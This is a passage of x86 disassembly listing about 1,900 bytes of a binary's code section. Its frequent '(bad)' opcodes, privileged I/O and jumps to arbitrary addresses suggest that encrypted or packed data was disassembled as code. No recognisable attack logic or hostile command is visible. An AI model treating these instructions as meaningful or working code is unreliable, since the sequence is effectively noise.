  401908:	shl    DWORD PTR ss:[eax+0x47],cl
  40190c:	mov    ds:0xb50c5124,al
  401911:	stos   DWORD PTR es:[edi],eax
  401912:	ja     0x4018d1
  401914:	xchg   DWORD PTR [edx+0x26],esp
  401917:	rcl    bl,0xa7
  40191a:	sbb    al,0x2c
  40191c:	xchg   edx,eax
  40191d:	addr16 dec esp
  40191f:	in     eax,0x47
  401921:	ins    DWORD PTR es:[edi],dx
  401922:	rcr    BYTE PTR [ebp-0x19f751ed],1
  401928:	add    BYTE PTR [edi+eax*4-0x3],dh
  40192c:	mov    ?,ebp
  40192e:	cmc    
  40192f:	idiv   BYTE PTR [edi+0x3e]
  401932:	daa    
  401933:	hlt    
  401934:	sub    edx,DWORD PTR [ecx+0x2c350bda]
  40193a:	or     eax,0x9e138ab5
  40193f:	fisubr DWORD PTR [ecx+0x12]
  401942:	mov    BYTE PTR [eax],bh
  401944:	jle    0x401927
  401946:	pop    es
  401947:	and    eax,DWORD PTR [ebp+eax*1+0x76b95980]
  40194e:	mov    WORD PTR [edx+0x60],gs
  401951:	adc    esi,eax
  401953:	adc    al,0xac
  401955:	cmp    BYTE PTR [eax+0x5a],bl
  401958:	mov    esp,0x173942fb
  40195d:	and    eax,0x9f5a44c9
  401962:	or     bh,BYTE PTR [esi+0x1e]
  401965:	lods   eax,DWORD PTR ds:[esi]
  401966:	dec    ebp
  401967:	lods   eax,DWORD PTR ds:[esi]
  401968:	and    eax,0x79444679
  40196d:	aaa    
  40196e:	jge    0x401963
  401970:	pop    edi
  401971:	mov    ah,0x5f
  401973:	fadd   DWORD PTR [eax+esi*1+0x11]
  401977:	in     al,0x49
  401979:	leave  
  40197a:	fnstenv [edi-0x7a]
  40197d:	test   ebx,ebp
  40197f:	out    dx,al
  401980:	mov    al,ds:0xbaf2e67f
  401985:	(bad)  
  401986:	and    eax,DWORD PTR [esi]
  401988:	icebp  
  401989:	mov    bh,0xe8
  40198b:	xor    BYTE PTR [edx],dl
  40198d:	fbstp  TBYTE PTR [esi-0x3002fbde]
  401993:	xchg   edi,eax
  401994:	dec    esi
  401995:	jp     0x4019dd
  401997:	xchg   DWORD PTR [eax+0x7dbad1e5],esp
  40199d:	mov    bh,0xd
  40199f:	push   eax
  4019a0:	fstp   QWORD PTR [ecx+0x78]
  4019a3:	lods   eax,DWORD PTR ds:[esi]
  4019a4:	dec    ebp
  4019a5:	adc    al,0x4e
  4019a7:	mov    DWORD PTR [esp+eax*2-0x3e],eax
  4019ab:	push   eax
  4019ac:	test   eax,0xa1d35fd6
  4019b1:	ds mov ah,0xc4
  4019b4:	pop    ss
  4019b5:	add    ch,BYTE PTR [bx+si+0xa]
  4019b9:	(bad)  
  4019ba:	ins    BYTE PTR es:[edi],dx
  4019bb:	mov    BYTE PTR [ebp-0x10],dl
  4019be:	jmp    0x1594db03
  4019c3:	les    esi,FWORD PTR [esi]
  4019c5:	mov    WORD PTR [eax+0x28],ss
  4019c8:	xor    al,0xdc
  4019ca:	jmp    0x401a2f
  4019cc:	enter  0xc035,0xc7
  4019d0:	(bad)  
  4019d1:	fst    QWORD PTR [edx+edx*2-0x62c14edb]
  4019d8:	sub    edi,DWORD PTR [edx]
  4019da:	out    dx,al
  4019db:	push   ebp
  4019dc:	and    eax,DWORD PTR [ebx+esi*4+0x75c8a8cd]
  4019e3:	xor    BYTE PTR [di-0x1221],cl
  4019e8:	je     0x4019d7
  4019ea:	adc    eax,0x236f1dd2
  4019ef:	out    0x98,al
  4019f1:	adc    edx,DWORD PTR [ecx-0x9]
  4019f4:	adc    al,0x4f
  4019f6:	sub    eax,0x572783
  4019fb:	pop    ss
  4019fc:	aam    0x5d
  4019fe:	lahf   
  4019ff:	jo     0x401a45
  401a01:	jle    0x401987
  401a03:	shl    BYTE PTR [ecx+0x67],0xbb
  401a07:	leave  
  401a08:	or     eax,0xb5b94d06
  401a0d:	sub    eax,0x91131568
  401a12:	imul   ecx,esi,0x4d
  401a15:	and    al,0x6d
  401a17:	(bad)  
  401a18:	mov    esi,0x4e309d9b
  401a1d:	adc    BYTE PTR [ecx-0x7a1ec985],al
  401a23:	retf   
  401a24:	sbb    eax,0x48b6cd23
  401a29:	mov    esi,ss
  401a2b:	call   0x660c:0x16a82da7
  401a32:	xchg   ebx,eax
  401a33:	mov    bl,0x47
  401a35:	pop    ecx
  401a36:	push   ss
  401a37:	xlat   BYTE PTR ds:[ebx]
  401a38:	pop    eax
  401a39:	std    
  401a3a:	je     0x401a66
  401a3c:	rol    DWORD PTR [ecx],1
  401a3e:	fstp   TBYTE PTR [edi+0x62b42150]
  401a44:	mov    esp,0x30764ff6
  401a49:	cmp    di,sp
  401a4c:	and    dl,bl
  401a4e:	mov    bh,0xca
  401a50:	imul   ebp,DWORD PTR [ebp+0x1295af6],0x410e2826
  401a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a5b:	stos   DWORD PTR es:[edi],eax
  401a5c:	outs   dx,BYTE PTR ds:[esi]
  401a5d:	jo     0x401a85
  401a5f:	push   ebx
  401a60:	cmp    al,0x95
  401a62:	ret    
  401a63:	lods   al,BYTE PTR ds:[esi]
  401a64:	pop    ebp
  401a65:	mov    ebx,0x27f7a789
  401a6a:	mov    ch,0x81
  401a6c:	mov    dh,0xa1
  401a6e:	mov    DWORD PTR [edi+0x55],esi
  401a71:	pop    edx
  401a72:	in     al,0x36
  401a74:	aad    0x34
  401a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a78:	add    ebp,DWORD PTR [ebx-0x2b]
  401a7b:	in     eax,dx
  401a7c:	inc    edi
  401a7d:	hlt    
  401a7e:	jae    0x401a36
  401a80:	push   esp
  401a81:	lds    edi,FWORD PTR [ecx]
  401a83:	add    eax,0x6dcf0bcc
  401a88:	jge    0x401adf
  401a8a:	retf   0x4424
  401a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a8e:	cli    
  401a8f:	test   DWORD PTR [ebp-0x5d],ebp
  401a92:	pushf  
  401a93:	ret    0xf13
  401a96:	fstp   TBYTE PTR [esi]
  401a98:	arpl   WORD PTR [ecx],cx
  401a9a:	push   ecx
  401a9b:	xor    BYTE PTR [edi+0x76a87781],cl
  401aa1:	cmp    DWORD PTR [esi+0x5ab6241a],eax
  401aa7:	mov    al,0x95
  401aa9:	sub    eax,0xc73e3995
  401aae:	push   esi
  401aaf:	push   ebx
  401ab0:	xchg   esp,eax
  401ab1:	js     0x401a60
  401ab3:	js     0x401af8
  401ab5:	dec    eax
  401ab6:	dec    ecx
  401ab7:	arpl   WORD PTR [esi+0x7ed2a595],ax
  401abd:	jp     0x401a84
  401abf:	cwde   
  401ac0:	call   0xca6b135d
  401ac5:	bound  ecx,QWORD PTR [ecx]
  401ac7:	cmp    al,0x26
  401ac9:	mov    ah,BYTE PTR [ecx]
  401acb:	push   edi
  401acc:	call   0xd56d27a9
  401ad1:	push   ss
  401ad2:	popa   
  401ad3:	pushf  
  401ad4:	aad    0x10
  401ad6:	jl     0x401ac6
  401ad8:	outs   dx,DWORD PTR ds:[esi]
  401ad9:	popa   
  401ada:	pop    ss
  401adb:	int3   
  401adc:	xchg   edx,eax
  401add:	shl    DWORD PTR [esi+0x6c03b8b5],cl
  401ae3:	in     eax,dx
  401ae4:	add    edi,DWORD PTR [edi-0x3c]
  401ae7:	lods   eax,DWORD PTR ds:[esi]
  401ae8:	lds    edx,FWORD PTR [esp+ecx*8]
  401aeb:	call   0x920568e9
  401af0:	out    0x79,eax
  401af2:	cmp    edx,0x51
  401af5:	adc    edi,DWORD PTR [edx]
  401af7:	mov    dl,0xa5
  401af9:	ss aad 0xa2
  401afc:	sbb    eax,0xd3b7c398
  401b01:	inc    esp
  401b02:	lahf   
  401b03:	mov    ebp,0xaa16189f
  401b08:	add    ebp,esp
  401b0a:	pop    ds
  401b0b:	mov    eax,ds:0x6a3a32e8
  401b10:	sub    eax,0xcbeeaca
  401b15:	(bad)  
  401b16:	(bad)
  401b19:	mov    ah,ch
  401b1b:	leave  
  401b1c:	and    ch,BYTE PTR gs:[ebp-0x76327692]
  401b23:	mov    eax,0xf35f08fd
  401b28:	rcr    DWORD PTR [edi+0x3b763b72],0xd3
  401b2f:	and    BYTE PTR [ecx-0x45b832be],0x1a
  401b36:	push   cs
  401b37:	div    DWORD PTR [edx]
  401b39:	test   al,0xb1
  401b3b:	imul   eax,DWORD PTR [edx+0x270f849],0x98535ac4
  401b45:	or     DWORD PTR [esi+0x5d],edx
  401b48:	mov    ch,0x1b
  401b4a:	loope  0x401b27
  401b4c:	add    al,0x67
  401b4e:	mov    bl,0x6e
  401b50:	(bad)  
  401b51:	icebp  
  401b52:	pop    esp
  401b53:	dec    edx
  401b54:	dec    eax
  401b55:	jecxz  0x401bba
  401b57:	dec    edx
  401b58:	xchg   ecx,eax
  401b59:	xor    esp,DWORD PTR [eax+0x6d23237a]
  401b5f:	jb     0x401b64
  401b61:	popa   
  401b62:	call   0x8c5152a2
  401b67:	adc    al,0x78
  401b69:	mov    ds:0x8a4950b2,al
  401b6e:	xor    DWORD PTR es:[esi],ebp
  401b71:	idiv   DWORD PTR [edx+0xe]
  401b74:	mov    dh,0xbf
  401b76:	xchg   ebp,edx
  401b78:	das    
  401b79:	sub    BYTE PTR [ecx-0x67],dl
  401b7c:	(bad)  
  401b7d:	jmp    0x401b4b
  401b7f:	inc    ebx
  401b80:	inc    eax
  401b81:	imul   esp,DWORD PTR ds:0x1edc3ecf,0x7ac7fd45
  401b8b:	ror    DWORD PTR [edx],cl
  401b8d:	pop    ss
  401b8e:	xlat   BYTE PTR ds:[ebx]
  401b8f:	xor    al,0x91
  401b91:	dec    edx
  401b92:	mov    ah,0x6c
  401b94:	lahf   
  401b95:	iret   
  401b96:	and    esp,DWORD PTR [ebx]
  401b98:	(bad)  [eax-0x6]
  401b9b:	and    ecx,DWORD PTR [ecx]
  401b9d:	mov    ebp,0xa0d25fe9
  401ba2:	and    BYTE PTR [edx+0x3c],dl
  401ba5:	xchg   esi,eax
  401ba6:	retf   0x6d15
  401ba9:	inc    eax
  401baa:	rcr    ecx,1
  401bac:	out    dx,eax
  401bad:	lods   eax,DWORD PTR ds:[esi]
  401bae:	out    0xba,al
  401bb0:	stos   DWORD PTR es:[edi],eax
  401bb1:	cs cmp al,0x3f
  401bb4:	jb     0x401b9f
  401bb6:	cmp    ch,0x9b
  401bb9:	mov    ch,0xd0
  401bbb:	(bad)  
  401bbc:	pop    eax
  401bbd:	adc    dl,BYTE PTR [ebx-0x37]
  401bc0:	(bad)  
  401bc2:	sub    edi,DWORD PTR [eax+0x41]
  401bc5:	jl     0x401bb4
  401bc7:	adc    ebx,DWORD PTR [ebx-0x50f95d8a]
  401bcd:	ja     0x401c39
  401bcf:	adc    DWORD PTR [ebx+0x21],esi
  401bd2:	jo     0x401c0e
  401bd4:	mov    cs,WORD PTR [ecx-0x4abde643]
  401bda:	aad    0x9f
  401bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bdd:	(bad)  
  401bde:	scas   al,BYTE PTR es:[edi]
  401bdf:	mov    esi,0xc0beec91
  401be4:	sbb    al,0x61
  401be6:	sahf   
  401be7:	jge    0x401b6c
  401be9:	rol    cl,0x8b
  401bec:	inc    ebp
  401bed:	in     eax,0xb7
  401bef:	pop    ebp
  401bf0:	sahf   
  401bf1:	ss mov al,0xef
  401bf4:	inc    esi
  401bf5:	fs xchg edx,eax
  401bf7:	cld    
  401bf8:	mov    ss,WORD PTR [eax]
  401bfa:	push   edi
  401bfb:	xchg   edx,eax
  401bfc:	aad    0xf5
  401bfe:	jmp    0x401bf5
  401c00:	out    dx,eax
  401c01:	or     edi,DWORD PTR [ecx]
  401c03:	inc    esi
  401c04:	mov    ch,0x63
  401c06:	xor    cl,BYTE PTR [ebx-0x2888bb3]
  401c0c:	pop    edx
  401c0d:	pop    ebx
  401c0e:	ins    BYTE PTR es:[edi],dx
  401c0f:	dec    esi
  401c10:	lods   al,BYTE PTR ds:[esi]
  401c11:	mov    ecx,0x70bcc1a5
  401c16:	popa   
  401c17:	add    al,0xab
  401c19:	cmp    DWORD PTR [ecx+0x1f],esp
  401c1c:	stc    
  401c1d:	cld    
  401c1e:	adc    eax,0xedf8cb55
  401c23:	and    bl,BYTE PTR [edx]
  401c25:	cli    
  401c26:	inc    ecx
  401c27:	imul   edi,DWORD PTR [ebp+0x72],0xffffffd0
  401c2b:	jecxz  0x401bd0
  401c2d:	clc    
  401c2e:	mov    bh,BYTE PTR [eax+ebp*2+0x6d]
  401c32:	in     eax,dx
  401c33:	hlt    
  401c34:	ret    
  401c35:	je     0x401bce
  401c37:	fcomp  QWORD PTR [ebp+0x7de2f269]
  401c3d:	les    ebp,FWORD PTR [esi]
  401c3f:	jg     0x401c95
  401c41:	rcr    DWORD PTR [ecx-0x6f],0xab
  401c45:	sbb    DWORD PTR [edx-0xd],esp
  401c48:	paddusw mm0,QWORD PTR [edx-0x736a8611]
  401c4f:	neg    BYTE PTR [ecx+0x7b]
  401c52:	icebp  
  401c53:	arpl   WORD PTR [eax-0x6e],cx
  401c56:	(bad)  
  401c57:	sbb    al,0xd5
  401c59:	imul   edx,DWORD PTR [ebx],0xa73afb3c
  401c5f:	out    dx,al
  401c60:	loope  0x401bfc
  401c62:	dec    esi
  401c63:	push   ss
  401c64:	add    eax,0xd2d1b713
  401c69:	mov    ds:0xc87c195f,eax
  401c6e:	cmp    ebp,DWORD PTR [edi-0x7c]
  401c71:	xor    DWORD PTR [edi+0x7d],0xffffffec
  401c75:	adc    dl,BYTE PTR [edi+0x56]
  401c78:	dec    edi
  401c79:	(bad)  
  401c7a:	sahf   
  401c7b:	ins    DWORD PTR es:[edi],dx
  401c7c:	ja     0x401cd6
  401c7e:	inc    ebp
  401c7f:	cmp    eax,0x4e43386a
  401c84:	aas    
  401c85:	test   ch,dl
  401c87:	test   DWORD PTR [ecx+0x6540b82c],ebp
  401c8d:	(bad)  
  401c8e:	jl     0x401cef
  401c90:	outs   dx,BYTE PTR ds:[esi]
  401c91:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  401c93:	nop
  401c94:	push   ecx
  401c95:	pop    ebp
  401c96:	pop    esi
  401c97:	sub    eax,DWORD PTR [edi]
  401c99:	int3   
  401c9a:	fadd   st,st(0)
  401c9c:	std    
  401c9d:	fild   DWORD PTR [edi-0x3e]
  401ca0:	mov    ds,WORD PTR [bx+di]
  401ca3:	and    al,0x8e
  401ca5:	in     al,dx
  401ca6:	mov    ah,0xf1
  401ca8:	repz jmp DWORD PTR [ecx-0x66]
  401cac:	cs adc al,cl
  401caf:	(bad)  
  401cb0:	xchg   ecx,eax
  401cb1:	sub    eax,DWORD PTR [esi]
  401cb3:	jmp    0x4398:0xbadbd5fd
  401cba:	adc    eax,0x1b435053
  401cbf:	out    dx,eax
  401cc0:	leave  
  401cc1:	mov    esp,0x77b33b15
  401cc6:	push   ebx
  401cc7:	out    dx,eax
  401cc8:	sbb    BYTE PTR [ebp+0x70],cl
  401ccb:	add    BYTE PTR [ebx],al
  401ccd:	(bad)  
  401cce:	stos   DWORD PTR es:[edi],eax
  401ccf:	cmp    al,0xbb
  401cd1:	pop    esi
  401cd2:	pusha  
  401cd3:	and    eax,0x49177bb7
  401cd8:	fcmovnbe st,st(2)
  401cda:	sub    bl,BYTE PTR [ecx+0x4]
  401cdd:	mov    esi,0x19c3a5f
  401ce2:	mov    DWORD PTR [esi+0x5c],eax
  401ce5:	mov    ds:0x16a6ab8c,eax
  401cea:	enter  0x9e8a,0x14
  401cee:	push   ss
  401cef:	jmp    0x401d6b
  401cf1:	or     eax,0x26ea38d8
  401cf6:	add    ecx,DWORD PTR [edx-0x43]
  401cf9:	cmp    al,0x12
  401cfb:	outs   dx,DWORD PTR ds:[esi]
  401cfc:	je     0x401d79
  401cfe:	lahf   
  401cff:	aam    0xb4
  401d01:	mov    ecx,0x60118b6d
  401d06:	mov    cl,0x24
  401d08:	lods   eax,DWORD PTR ds:[esi]
  401d09:	xor    ah,ch
  401d0b:	aas    
  401d0c:	(bad)
  401d10:	cmp    al,0x3c
  401d12:	cmp    BYTE PTR [edi+0x9a4dbb7],dh
  401d18:	jne    0x401cd8
  401d1a:	rcr    BYTE PTR [ebx],0x47
  401d1d:	inc    esp
  401d1e:	fsubr  DWORD PTR [edx]
  401d20:	cmp    al,0x92
  401d22:	addr16 aam 0x3e
  401d25:	mov    DWORD PTR [ecx+0x79428d2e],esp
  401d2b:	push   cs
  401d2c:	sub    eax,0xaec97cba
  401d31:	jmp    0x8b56b1f0
  401d36:	add    edx,DWORD PTR [ebx]
  401d38:	inc    esp
  401d39:	fbstp  TBYTE PTR [ebx-0x36438f02]
  401d3f:	pop    eax
  401d40:	or     esi,DWORD PTR [esi-0x43]
  401d43:	test   al,0x54
  401d45:	inc    edi
  401d46:	push   esi
  401d47:	mov    edi,0xc33e2942
  401d4c:	jne    0x401dab
  401d4e:	jp     0x401dc4
  401d50:	push   esp
  401d51:	or     eax,esp
  401d53:	pop    edx
  401d54:	add    ch,BYTE PTR [eax-0x29474352]
  401d5a:	xchg   edi,eax
  401d5b:	sbb    BYTE PTR [edi],0x53
  401d5e:	dec    edi
  401d5f:	xor    al,BYTE PTR fs:[edx]
  401d62:	dec    edi
  401d63:	lea    ebx,[ebp+0x7b]
  401d66:	arpl   di,sp
  401d68:	push   cs
  401d69:	mov    DWORD PTR [esi-0x46],ecx
  401d6c:	pop    ebp
  401d6d:	mov    esi,0x1d49180f
  401d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d73:	adc    eax,0x5c092891
  401d78:	das    
  401d79:	cmp    bl,BYTE PTR [eax-0x7b]
  401d7c:	and    al,0xfb
  401d7e:	cs std 
  401d80:	cmc    
  401d81:	aaa    
  401d82:	or     DWORD PTR [esi],ecx
  401d84:	adc    dl,dh
  401d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d87:	and    BYTE PTR [ecx],0x22
  401d8a:	jbe    0x401e0b
  401d8c:	pop    edi
  401d8d:	gs mov bl,al
  401d90:	push   ecx
  401d91:	dec    esp
  401d92:	cmp    al,0x56
  401d94:	(bad)  
  401d96:	fld    QWORD PTR [edi-0x46]
  401d99:	pop    esi
  401d9a:	mov    ah,0xcb
  401d9c:	jg     0x401d71
  401d9e:	push   edx
  401d9f:	ins    DWORD PTR es:[edi],dx
  401da0:	pop    ss
  401da1:	cmp    DWORD PTR ds:0x44902e6e,ecx
  401da7:	cmp    DWORD PTR [ecx-0x10],eax
  401daa:	into   
  401dab:	retf   
  401dac:	mov    esp,0xab9d60ef
  401db1:	mov    edi,0xcea7eec2
  401db6:	loop   0x401d58
  401db8:	push   ebx
  401db9:	push   ecx
  401dba:	push   eax
  401dbb:	jl     0x401dca
  401dbd:	or     DWORD PTR [edi+0x22],edi
  401dc0:	fnsave [esi+0x13]
  401dc3:	sub    DWORD PTR [edx],ebp
  401dc5:	xchg   edx,eax
  401dc6:	in     eax,0x8c
  401dc8:	shl    ebx,cl
  401dca:	scas   eax,DWORD PTR es:[edi]
  401dcb:	and    DWORD PTR [edx-0x23],edi
  401dce:	adc    eax,0xe1ead0
  401dd3:	outs   dx,DWORD PTR ds:[esi]
  401dd4:	stos   DWORD PTR es:[edi],eax
  401dd5:	stos   DWORD PTR es:[edi],eax
  401dd6:	or     eax,0x8a1a6374
  401ddb:	sub    BYTE PTR [edi+esi*8-0x11f97ba2],ah
  401de2:	imul   eax,DWORD PTR [ecx-0x47],0x677b0d4e
  401de9:	stc    
  401dea:	push   edi
  401deb:	jo     0x401dfb
  401ded:	xchg   ecx,eax
  401dee:	outs   dx,BYTE PTR ds:[esi]
  401def:	imul   edi,ebp,0x4566bed8
  401df5:	arpl   WORD PTR [edx+0x61],si
  401df8:	xchg   BYTE PTR [ecx+0x3a5e11f3],dh
  401dfe:	jge    0x401e2e
  401e00:	ret    
  401e01:	add    esp,DWORD PTR [ebp-0x45]
  401e04:	dec    edi
  401e05:	loop   0x401e47
  401e07:	and    cl,cl
  401e09:	add    eax,0x56f937fd
  401e0e:	push   0xd1cf3965
  401e13:	icebp  
  401e14:	pop    esi
  401e15:	inc    ecx
  401e16:	mov    esp,0xe3f36113
  401e1b:	pop    edi
  401e1c:	sub    eax,0x78f467d7
  401e21:	and    BYTE PTR [edx+0x2c],0xe5
  401e25:	fs ins DWORD PTR es:[edi],dx
  401e27:	push   eax
  401e28:	je     0x401dd7
  401e2a:	pop    esp
  401e2b:	aad    0x65
  401e2d:	mov    ebx,0xd00b8bda
  401e32:	jmp    0xa9aa5afa
  401e37:	adc    dl,BYTE PTR [eax+eiz*2+0x6a]
  401e3b:	push   edi
  401e3c:	ds sti 
  401e3e:	mov    edx,0x2d904e8
  401e43:	xor    BYTE PTR [esi+ebx*1],al
  401e46:	sahf   
  401e47:	fistp  QWORD PTR [esp+eiz*4+0x5c]
  401e4b:	mov    esi,esi
  401e4d:	push   ds
  401e4e:	(bad)  
  401e4f:	xchg   esi,eax
  401e50:	mov    cl,0xe9
  401e52:	adc    DWORD PTR [ebp-0x3a6754a],0x2c18d56a
  401e5c:	jne    0x401e98
  401e5e:	mov    esp,0x17663208
  401e63:	jge    0x401e44
  401e65:	cmc    
  401e66:	mov    cs,WORD PTR [ebp-0x5a]
  401e69:	sbb    edi,DWORD PTR [ecx+0x5026a63f]
  401e6f:	popf   
  401e70:	mov    BYTE PTR [ebx+0x4d],ch
  401e73:	clc    
  401e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e75:	mov    BYTE PTR [edx+0x3c],dl
  401e78:	(bad)  
  401e79:	gs dec ecx
  401e7b:	fld    st(1)
  401e7d:	popa   
  401e7e:	js     0x401ed4
  401e80:	mov    dl,0x74
  401e82:	push   eax
  401e83:	dec    esi
  401e84:	jecxz  0x401eea
  401e86:	push   es
  401e87:	hlt    
  401e88:	mov    esp,0x5da24e71
  401e8d:	or     edi,DWORD PTR [edx+0x57]
  401e90:	fld    DWORD PTR [eax]
  401e92:	(bad)  
  401e93:	(bad)  
  401e94:	bound  ecx,QWORD PTR [edx+0x13499fb0]
  401e9a:	or     edi,DWORD PTR [edx-0x105f5ded]
  401ea0:	pop    ebx
  401ea1:	inc    ecx
  401ea2:	mov    edx,0x250a35d7
  401ea7:	xchg   ebp,eax
  401ea8:	mov    edi,0xee55c702
  401ead:	sbb    eax,0x8f893418
  401eb2:	repz cdq 
  401eb4:	(bad)  
  401eb5:	mov    BYTE PTR es:[eax-0x3d1ded7d],bl
  401ebc:	xchg   ebx,eax
  401ebd:	xor    eax,0x5ccc907e
  401ec2:	cdq    
  401ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec4:	or     al,0x6f
  401ec6:	inc    esi
  401ec7:	or     bl,bh
  401ec9:	loopne 0x401f1a
  401ecb:	(bad)  
  401ecc:	test   DWORD PTR [eax],ebp
  401ece:	xchg   edx,eax
  401ecf:	nop
  401ed0:	lods   al,BYTE PTR ds:[esi]
  401ed1:	clc    
  401ed2:	sub    BYTE PTR [ecx-0x42],dh
  401ed5:	xchg   ecx,eax
  401ed6:	cld    
  401ed7:	push   0x3636a1da
  401edc:	sub    bl,BYTE PTR [edi+0xe]
  401edf:	and    al,0x25
  401ee1:	adc    cl,dl
  401ee3:	xor    ch,BYTE PTR [edi+eax*1+0x7d8ec60a]
  401eea:	lahf   
  401eeb:	cwde   
  401eec:	js     0x401ef1
  401eee:	(bad)  
  401eef:	sub    BYTE PTR [ecx-0x24],dl
  401ef2:	jbe    0x401edb
  401ef4:	je     0x401ea2
  401ef6:	cld    
  401ef7:	ss pop ecx
  401ef9:	dec    esi
  401efa:	ins    BYTE PTR es:[edi],dx
  401efb:	neg    BYTE PTR [ebp+0x3a]
  401efe:	cld    
  401eff:	js     0x401ef7
  401f01:	mov    dl,0xde
  401f03:	add    eax,0xbd7aee43
  401f08:	pop    ebp
  401f09:	push   ebp
  401f0a:	je     0x401f2f
  401f0c:	xor    eax,0xd0fb0bd
  401f11:	mov    edx,0x7250624e
  401f16:	jp     0x401f5b
  401f18:	cmp    al,0x60
  401f1a:	aad    0xd6
  401f1c:	jmp    0xfabf:0xb4077838
  401f23:	sbb    al,0xec
  401f25:	sub    esi,edi
  401f27:	pushf  
  401f28:	ins    BYTE PTR es:[edi],dx
  401f29:	mov    DWORD PTR [edi+0x225793dc],ebx
  401f2f:	int3   
  401f30:	rcr    DWORD PTR [esi+0x2b],0x8a
  401f34:	jno    0x401eda
  401f36:	and    bh,BYTE PTR [ecx+ebx*8+0x3]
  401f3a:	fild   DWORD PTR [esi-0x676fa0cc]
  401f40:	call   0xa35edfb9
  401f45:	pop    esp
  401f46:	fmul   DWORD PTR [esi]
  401f48:	jns    0x401f55
  401f4a:	add    DWORD PTR [edx+0x23],ebp
  401f4d:	mov    ch,0xc2
  401f4f:	add    BYTE PTR [edx-0x1f],ah
  401f52:	shr    BYTE PTR [esi+ebx*4-0x21a843f5],cl
  401f59:	xor    al,0x99
  401f5b:	pop    es
  401f5c:	jae    0x401ef0
  401f5e:	inc    edi
  401f5f:	sbb    ecx,DWORD PTR es:[edi+0x3d]
  401f63:	sub    edi,DWORD PTR [esi+0x7e]
  401f66:	push   ebx
  401f67:	lea    esi,[ecx]
  401f69:	push   ecx
  401f6a:	js     0x401f91
  401f6c:	fisubr DWORD PTR [ecx]
  401f6e:	pop    es
  401f6f:	out    dx,al
  401f70:	pop    edi
  401f71:	in     al,dx
  401f72:	ret    
  401f73:	cdq    
  401f74:	sub    eax,0xa87ba2ff
  401f79:	pushf  
  401f7a:	sbb    ch,ch
  401f7c:	into   
  401f7d:	push   esp
  401f7e:	les    edx,FWORD PTR [edx+0x1f3d8228]
  401f84:	inc    eax
  401f85:	add    al,0xe1
  401f87:	sub    bl,bh
  401f89:	inc    esp
  401f8a:	push   ebp
  401f8b:	mov    dh,0xb0
  401f8d:	push   ebx
  401f8e:	pop    esp
  401f8f:	pop    ebx
  401f90:	call   0x84f1ab1a
  401f95:	or     esp,DWORD PTR [ebp-0x44908dec]
  401f9b:	push   es
  401f9c:	retf   0x1704
  401f9f:	push   ecx
  401fa0:	imul   BYTE PTR [ecx+0x7b1452c8]
  401fa6:	(bad)  
  401fa7:	xor    al,0xe3
  401fa9:	and    al,0x90
  401fab:	in     al,dx
  401fac:	jle    0x401f8c
  401fae:	lock scas al,BYTE PTR es:[edi]
  401fb0:	mov    edx,DWORD PTR [esi-0x11]
  401fb3:	xchg   edi,eax
  401fb4:	jle    0x401fed
  401fb6:	mov    ds:0xcd309d7a,al
  401fbb:	enter  0xfe0c,0x6c
  401fbf:	mov    ebx,0x92288c23
  401fc4:	gs addr16 pop ss
  401fc7:	popa   
  401fc8:	sbb    edx,DWORD PTR [edi-0x4749535e]
  401fce:	xchg   edi,eax
  401fcf:	pop    edx
  401fd0:	loop   0x401feb
  401fd2:	ins    DWORD PTR es:[edi],dx
  401fd3:	inc    BYTE PTR [edi+eax*1-0x37]
  401fd7:	push   ebx
  401fd8:	xchg   ecx,eax
  401fd9:	xor    eax,0xb85aa579
  401fde:	adc    DWORD PTR [edi+0x2],esp
  401fe1:	or     eax,0xff80dd31
  401fe6:	or     BYTE PTR [ebp-0x25],bl
  401fe9:	adc    bh,BYTE PTR [ecx]
  401feb:	push   0x37
  401fed:	jnp    0x401fcf
  401fef:	add    DWORD PTR [esi],edi
  401ff1:	imul   eax,esp,0xfcc61833
  401ff7:	and    ebp,DWORD PTR [edi+edx*4]
  401ffa:	sahf   
  401ffb:	add    ecx,esp
  401ffd:	cld    
  401ffe:	jb     0x40201d
  402000:	mov    eax,ds:0xc0e52fa
  402005:	sbb    eax,0x94a499c7
  40200a:	mov    ebx,0x289232ff
  40200f:	cmp    ecx,ebx
  402011:	push   edi
  402012:	fisubr WORD PTR [ecx+0x26a1b9bc]
  402018:	daa    
  402019:	fild   QWORD PTR [ebx+0x391b15e7]
  40201f:	(bad)  
  402021:	add    al,0x67
  402023:	inc    ecx
  402024:	hlt    
  402025:	sub    eax,edi
  402027:	int    0x56
  402029:	pop    esp
  40202a:	arpl   dx,di
  40202c:	(bad)  
  40202d:	jle    0x401fc2
  40202f:	test   eax,0xb6ffc22e
  402034:	cmp    edi,edx
  402036:	imul   ecx,DWORD PTR [eax-0x71],0xbfc93be8
  40203d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40203e:	inc    ebx
  40203f:	cdq    
  402040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402041:	dec    edi
  402042:	pushf  
  402043:	and    BYTE PTR [ebx+ebp*4-0x7b6dc4b0],cl
  40204a:	sti    
  40204b:	and    BYTE PTR ds:0x11dea4ba,0x87
  402052:	enter  0x7beb,0xd3
  402056:	and    cl,BYTE PTR [eax]
  402058:	call   0x42a5:0xa42a8f45
  40205f:	push   0x6cc37998
  402064:	or     esp,DWORD PTR [esi-0x3ceead83]
  40206a:	or     DWORD PTR [eax-0x5037a010],ebx
  402070:	addr16 std 
  402072:	outs   dx,BYTE PTR ds:[esi]
  402073:	sar    ebp,0x62
  402076:	test   al,0xec
  402078:	or     bl,bl
  40207a:	cwde   
  40207b:	daa    
  40207c:	jl     0x401ffe
  40207e:	shl    BYTE PTR cs:[ebp+0x70],cl
  402082:	mov    edx,0x9e7ee43
  402087:	repnz adc eax,0xb1e0adcd
  40208d:	int    0xf4
  40208f:	enter  0x79ed,0xe2
  402093:	fwait
  402094:	sbb    eax,0xc67f04cf
  402099:	or     BYTE PTR [ebp+eiz*2-0x2e],0xf5
  40209e:	pusha  
